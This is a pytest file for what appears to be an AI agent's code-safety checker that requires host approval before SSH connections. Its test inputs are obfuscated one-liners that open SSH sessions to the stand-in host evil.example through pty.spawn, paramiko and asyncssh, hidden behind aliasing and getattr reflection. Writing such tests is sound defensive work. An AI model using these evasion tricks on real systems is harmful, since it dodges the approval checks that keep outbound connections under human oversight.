import pytest
from core.inference.tools import _check_code_safety
from state.ssh_approvals import approve_hosts, reset_ssh_approvals

@pytest.mark.parametrize('code',[
 "import pty; pty.spawn(['ssh','-F','none','evil.example'])",
 "from pty import spawn as launch; launch(['ssh','-F','none','evil.example'])",
 "import pty as p; launch=p.spawn; launch(argv=['ssh','-F','none','evil.example'])",
 "import paramiko; getattr(paramiko,'SSHClient')().connect(hostname='evil.example')",
 "import paramiko; factory=getattr(paramiko,'SSHClient'); client=factory(); client.connect(hostname='evil.example')",
 "import paramiko; client=paramiko.SSHClient(); getattr(client,'connect')(hostname='evil.example')",
 "import paramiko; client=paramiko.SSHClient(); connect=getattr(client,'connect'); connect(hostname='evil.example')",
 "import asyncssh; getattr(asyncssh,'connect')('evil.example',config=None)",
])
def test_reflective_and_pty_ssh_requires_approval(code):
 reset_ssh_approvals()
 assert _check_code_safety(code,session_id='round15') is not None
 approve_hosts('round15',['evil.example'])
 assert _check_code_safety(code,session_id='round15') is None

@pytest.mark.parametrize('code',[
 "import paramiko; name='SSHClient'; getattr(paramiko,name)().connect(hostname='evil.example')",
 "import paramiko; client=paramiko.SSHClient(); name='connect'; getattr(client,name)(hostname='evil.example')",
])
def test_dynamic_ssh_reflection_fails_closed(code):
 reset_ssh_approvals();approve_hosts('round15',['evil.example'])
 assert _check_code_safety(code,session_id='round15') is not None


def test_unrelated_reflection_remains_allowed():
 reset_ssh_approvals()
 assert _check_code_safety("import paramiko; print(getattr(paramiko,'__version__'))",session_id='round15') is None
